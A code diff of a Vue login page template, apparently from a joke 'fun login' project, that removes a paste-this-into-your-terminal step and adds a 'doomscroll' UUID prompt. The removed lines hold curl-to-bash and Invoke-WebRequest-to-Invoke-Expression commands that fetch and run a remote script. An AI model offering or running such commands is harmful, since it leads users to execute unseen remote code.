@@ -30,19 +30,13 @@ const checkIfUserIsDone = async () => {
             can do both here!
         </h2>
         <span
-            >Copy and paste this to your fav terminal! dw the code is open
-            source and not malware.</span
+            >Please doomscoll and like or note the specitfic posts to login!
+        </span>
+        <input type="text" placeholder="Please enter your uuid" />
+        <span
+            >you can get one at
+            <a href="https://everyuuid.com">everyuuid.com </a></span
         >
-        <br />
-        <code v-if="isWindows">
-            Invoke-WebRequest
-            https://funlogin.vrl.yhw.tw/download/account-verify |
-            Invoke-Expression --client=codecodecode
-        </code>
-        <code v-else>
-            curl -s https://funlogin.vrl.yhw.tw/download/account-verify | bash
-            -s -- --client=codecodecode
-        </code>
-        <button @click="checkIfUserIsDone">Check request</button>
+        <!--DOOMSCROLL-->
     </div>
 </template>
